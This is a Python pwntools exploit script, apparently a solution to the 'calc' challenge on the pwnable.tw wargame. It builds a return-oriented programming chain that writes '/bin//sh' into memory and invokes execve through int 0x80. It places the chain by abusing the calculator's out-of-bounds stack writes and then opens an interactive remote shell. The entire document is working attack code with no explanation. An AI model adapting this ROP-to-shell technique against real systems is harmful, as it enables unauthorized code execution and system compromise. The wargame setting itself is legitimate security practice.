from pwn import *

q = []
q.append(0x080701aa)
q.append(0x080ec060)
q.append(0x0805c34b) # pop eax ; ret
q.append(u32('/bin'))
q.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
q.append(0x080701aa) # pop edx ; ret
q.append(0x080ec064) # @ .data + 4
q.append(0x0805c34b) # pop eax ; ret
q.append(u32('//sh'))
q.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
q.append(0x080701aa) # pop edx ; ret
q.append(0x080ec068) # @ .data + 8
q.append(0x080550d0) # xor eax, eax ; ret
q.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
q.append(0x080481d1) # pop ebx ; ret
q.append(0x080ec060) # @ .data
q.append(0x080701d1) # pop ecx ; pop ebx ; ret
q.append(0x080ec068) # @ .data + 8
q.append(0x080ec060) # padding without overwrite ebx
q.append(0x080701aa) # pop edx ; ret
q.append(0x080ec068) # @ .data + 8
q.append(0x080550d0) # xor eax, eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x0807cb7f) # inc eax ; ret
q.append(0x08049a21) # int 0x80

# p = process('./calc')
p = remote('chall.pwnable.tw', 10100)
# gdb.attach(p, '''b *0x0804939e''')

p.recvline()

pointer = 361
for i in range(len(q)):
	p.sendline('+' + str(pointer+i))
	leak = int(p.recvline()[:-1])
	if q[i]>leak:
		p.sendline('+' + str(pointer+i) + '+' + str(q[i]-leak))
		print p.recvline()
	if q[i]<leak:
		p.sendline('+' + str(pointer+i) + str(q[i]-leak))
		print p.recvline()
	if q[i]==leak:
		print 'lol'
		continue

p.sendline()
p.interactive()